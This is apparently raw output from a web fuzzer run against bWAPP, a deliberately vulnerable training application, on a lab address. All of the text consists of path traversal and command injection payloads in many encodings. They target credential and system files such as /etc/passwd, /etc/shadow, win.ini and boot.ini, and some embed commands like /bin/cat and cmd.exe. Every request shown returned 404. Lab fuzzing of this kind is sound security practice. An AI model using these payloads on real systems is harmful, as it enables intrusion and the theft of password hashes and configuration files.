27,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c
28,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c
29,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c
2,404,9L,39W,http://10.0.2.4/bWAPP/\..\..\WINDOWS\win.ini
30,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c
3,404,9L,39W,http://10.0.2.4/bWAPP/\..\..\..\WINDOWS\win.ini
4,404,9L,39W,http://10.0.2.4/bWAPP/\..\..\..\..\WINDOWS\win.ini
11,404,9L,39W,http://10.0.2.4/bWAPP/%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69
5,404,9L,39W,http://10.0.2.4/bWAPP/\..\..\..\..\..\WINDOWS\win.ini
6,404,9L,39W,http://10.0.2.4/bWAPP/\..\..\..\..\..\..\WINDOWS\win.ini
7,404,9L,39W,http://10.0.2.4/bWAPP/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69
8,404,9L,39W,http://10.0.2.4/bWAPP/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69
9,404,9L,39W,http://10.0.2.4/bWAPP/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69
10,404,9L,39W,http://10.0.2.4/bWAPP/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69
12,404,9L,39W,http://10.0.2.4/bWAPP/%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69
1,404,9L,39W,http://10.0.2.4/bWAPP/\..\WINDOWS\win.ini
31,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c
40,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
39,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
43,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
41,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
46,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
45,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
44,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
42,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
57,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%2f%2e%2e%2f%2e%68%74%61%63%63%65%73%73
56,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%68%74%61%63%63%65%73%73
58,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%2f%2e%68%74%61%63%63%65%73%73
60,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2f%2e%2f%2e%68%74%61%63%63%65%73%73
66,404,9L,39W,http://10.0.2.4/bWAPP/../../../../../../../../../../../../etc/hosts%00
69,404,9L,39W,http://10.0.2.4/bWAPP//../../../../../../../../%2A
70,404,9L,39W,http://10.0.2.4/bWAPP/../../../../../../../../../../../../etc/passwd%00
72,404,9L,39W,http://10.0.2.4/bWAPP/../../../../../../../../../../../../etc/shadow%00
78,404,9L,39W,http://10.0.2.4/bWAPP//./././././././././././etc/passwd
83,404,9L,39W,http://10.0.2.4/bWAPP/..\..\..\..\..\..\..\..\..\..\etc\shadow
80,404,9L,39W,http://10.0.2.4/bWAPP/\..\..\..\..\..\..\..\..\..\..\etc\passwd
82,404,9L,39W,http://10.0.2.4/bWAPP/..\..\..\..\..\..\..\..\..\..\etc\passwd
79,404,9L,39W,http://10.0.2.4/bWAPP//./././././././././././etc/shadow
81,404,9L,39W,http://10.0.2.4/bWAPP/\..\..\..\..\..\..\..\..\..\..\etc\shadow
84,404,9L,39W,http://10.0.2.4/bWAPP//..\../..\../..\../..\../..\../..\../etc/passwd
85,404,9L,39W,http://10.0.2.4/bWAPP//..\../..\../..\../..\../..\../..\../etc/shadow
89,404,9L,39W,http://10.0.2.4/bWAPP/\..\..\..\..\..\..\..\..\..\..\etc\shadow%00
86,404,9L,39W,http://10.0.2.4/bWAPP/.\\./.\\./.\\./.\\./.\\./.\\./etc/passwd
88,404,9L,39W,http://10.0.2.4/bWAPP/\..\..\..\..\..\..\..\..\..\..\etc\passwd%00
87,404,9L,39W,http://10.0.2.4/bWAPP/.\\./.\\./.\\./.\\./.\\./.\\./etc/shadow
90,404,9L,39W,http://10.0.2.4/bWAPP/..\..\..\..\..\..\..\..\..\..\etc\passwd%00
94,404,9L,39W,http://10.0.2.4/bWAPP/%00/etc/passwd%00
93,404,10L,41W,http://10.0.2.4/bWAPP/%0a/bin/cat%20/etc/shadow
92,404,10L,41W,http://10.0.2.4/bWAPP/%0a/bin/cat%20/etc/passwd
95,404,9L,39W,http://10.0.2.4/bWAPP/%00/etc/shadow%00
91,404,9L,39W,http://10.0.2.4/bWAPP/..\..\..\..\..\..\..\..\..\..\etc\shadow%00
98,404,9L,39W,http://10.0.2.4/bWAPP//../../../../../../../../../../../etc/passwd%00.jpg
96,404,9L,39W,http://10.0.2.4/bWAPP/%00../../../../../../etc/passwd
97,404,9L,39W,http://10.0.2.4/bWAPP/%00../../../../../../etc/shadow
100,404,9L,39W,http://10.0.2.4/bWAPP//..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd
101,404,9L,39W,http://10.0.2.4/bWAPP//..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow
99,404,9L,39W,http://10.0.2.4/bWAPP//../../../../../../../../../../../etc/passwd%00.html
104,404,9L,39W,http://10.0.2.4/bWAPP/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00
105,404,9L,39W,http://10.0.2.4/bWAPP//%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00
107,404,9L,39W,http://10.0.2.4/bWAPP//%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..winnt/desktop.ini
108,404,9L,40W,http://10.0.2.4/bWAPP/\\'/bin/cat%20/etc/passwd\\&apos
109,404,9L,40W,http://10.0.2.4/bWAPP/\\'/bin/cat%20/etc/shadow\\&apos
113,404,9L,39W,http://10.0.2.4/bWAPP/C:\inetpub\wwwroot\global.asa
112,404,9L,39W,http://10.0.2.4/bWAPP/C:/inetpub/wwwroot/global.asa
115,404,9L,39W,http://10.0.2.4/bWAPP/C:\boot.ini
114,404,9L,39W,http://10.0.2.4/bWAPP/C:/boot.ini
118,404,9L,39W,http://10.0.2.4/bWAPP/../../../../../../../../../../../../boot.ini%00
116,404,9L,39W,http://10.0.2.4/bWAPP/../../../../../../../../../../../../localstart.asp%00
121,404,9L,39W,http://10.0.2.4/bWAPP//../../../../../../../../../../../boot.ini%00
120,404,9L,39W,http://10.0.2.4/bWAPP//./././././././././././boot.ini
124,404,9L,39W,http://10.0.2.4/bWAPP//.\\./.\\./.\\./.\\./.\\./.\\./boot.ini
123,404,9L,39W,http://10.0.2.4/bWAPP//..\../..\../..\../..\../..\../..\../boot.ini
125,404,9L,39W,http://10.0.2.4/bWAPP/\..\..\..\..\..\..\..\..\..\..\boot.ini
128,404,9L,39W,http://10.0.2.4/bWAPP//../../../../../../../../../../../boot.ini%00.html
126,404,9L,39W,http://10.0.2.4/bWAPP/..\..\..\..\..\..\..\..\..\..\boot.ini%00
129,404,9L,39W,http://10.0.2.4/bWAPP//../../../../../../../../../../../boot.ini%00.jpg
130,404,9L,39W,http://10.0.2.4/bWAPP//.../.../.../.../.../
127,404,9L,39W,http://10.0.2.4/bWAPP/..\..\..\..\..\..\..\..\..\..\boot.ini
131,404,9L,39W,http://10.0.2.4/bWAPP/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini
